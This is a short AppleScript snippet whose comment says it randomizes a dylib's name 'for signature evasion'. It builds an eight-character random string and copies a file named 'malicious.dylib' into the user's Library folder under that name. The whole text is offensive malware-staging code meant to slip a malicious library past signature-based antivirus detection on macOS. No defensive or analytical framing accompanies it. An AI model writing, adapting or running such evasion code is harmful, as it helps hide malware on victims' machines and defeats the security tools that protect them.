-- Randomizes dylib name for signature evasion
set randname to (do shell script "LC_CTYPE=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8")
do shell script "cp ~/malicious.dylib ~/Library/" & randname & ".dylib"
